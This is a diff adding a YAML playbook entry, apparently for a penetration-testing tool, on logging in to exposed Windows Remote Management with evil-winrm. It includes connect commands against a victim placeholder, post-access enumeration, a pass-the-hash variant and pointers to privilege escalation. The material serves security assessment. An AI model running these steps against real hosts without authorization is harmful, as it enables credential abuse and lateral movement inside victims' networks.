@@ -1,0 +1,43 @@
+chain_id: winrm_login
+title: "WinRM — connect with valid credentials (evil-winrm)"
+severity: HIGH
+tags: [winrm, windows, evil-winrm, lateral-movement]
+
+trigger:
+  any_of:
+    - { port: 5985 }
+    - { port: 5986 }
+    - { service_pattern: "(?i)wsman|winrm" }
+
+description: |
+  Windows Remote Management service exposed (5985/tcp HTTP, 5986/tcp HTTPS).
+  With valid credentials this is one of the cleanest lateral-movement
+  channels on a Windows host — evil-winrm provides an interactive PowerShell
+  prompt, file upload/download, and history.
+
+steps:
+  - id: 1
+    title: "Connect with username and password"
+    command: evil-winrm -i $VICTIMA -u USUARIO -p PASSWORD
+
+  - id: 2
+    title: "Enumerate the local environment after landing"
+    command: |
+      whoami /priv
+      whoami /groups
+      systeminfo
+      net user
+      net localgroup administrators
+    notes: |
+      Triage the privileges: if SeImpersonatePrivilege is enabled, see chain
+      seimpersonate_printspoofer for SYSTEM escalation.
+
+common_errors:
+  - error: "Error: WinRM authentication failed"
+    solution: |
+      Confirm the user exists (RID brute via SMB) and the password is exact.
+      Try -H NTHASH instead of -p PASSWORD if you only have the hash:
+        evil-winrm -i $VICTIMA -u USUARIO -H aad3b435...
+
+references:
+  - https://github.com/Hackplayers/evil-winrm
